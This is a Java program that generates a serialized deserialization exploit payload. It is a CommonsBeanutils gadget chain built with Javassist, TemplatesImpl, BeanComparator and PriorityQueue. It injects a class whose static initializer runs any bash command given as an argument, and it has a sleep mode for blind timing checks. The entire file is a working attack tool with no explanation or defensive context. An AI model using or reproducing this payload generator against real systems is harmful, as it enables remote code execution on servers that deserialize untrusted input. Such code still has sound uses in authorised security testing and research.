import javassist.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.ComparableComparator;
import java.lang.reflect.Field;
import java.io.*;
import java.util.*;

public class GenJ8 {
    public static void main(String[] args) throws Exception {
        String cmd = args[0];
        String outFile = args[1];

        ClassPool pool = ClassPool.getDefault();
        pool.appendClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));

        CtClass cz = pool.makeClass("Evil_" + System.currentTimeMillis());
        cz.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cz.addInterface(pool.get("java.io.Serializable"));

        CtConstructor cc = cz.makeClassInitializer();
        String body;
        if (cmd.startsWith("SLEEP:")) {
            body = "{ Thread.sleep(" + cmd.substring(6) + "L); }";
        } else {
            body = "{ Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",\"" + cmd + "\"}); }";
        }
        cc.setBody(body);
        cz.addMethod(CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i, com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}", cz));
        cz.addMethod(CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}", cz));

        byte[] evil = cz.toBytecode();

        TemplatesImpl tpl = new TemplatesImpl();
        set(tpl, "_bytecodes", new byte[][]{evil});
        set(tpl, "_name", "x");

        BeanComparator cmp = new BeanComparator("outputProperties", new ComparableComparator());
        PriorityQueue<Object> pq = new PriorityQueue<>(2, cmp);
        Field qf = PriorityQueue.class.getDeclaredField("queue"); qf.setAccessible(true);
        qf.set(pq, new Object[]{tpl, tpl});
        Field sf = PriorityQueue.class.getDeclaredField("size"); sf.setAccessible(true);
        sf.set(pq, 2);

        try (ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(outFile))) {
            o.writeObject(pq);
        }
        System.out.println("written " + outFile + " evil=" + evil.length + "B classfile v" + (((evil[6] & 0xFF) << 8) | (evil[7] & 0xFF)));
    }
    static void set(Object o, String f, Object v) throws Exception {
        Field fd = o.getClass().getDeclaredField(f);
        fd.setAccessible(true);
        fd.set(o, v);
    }
}
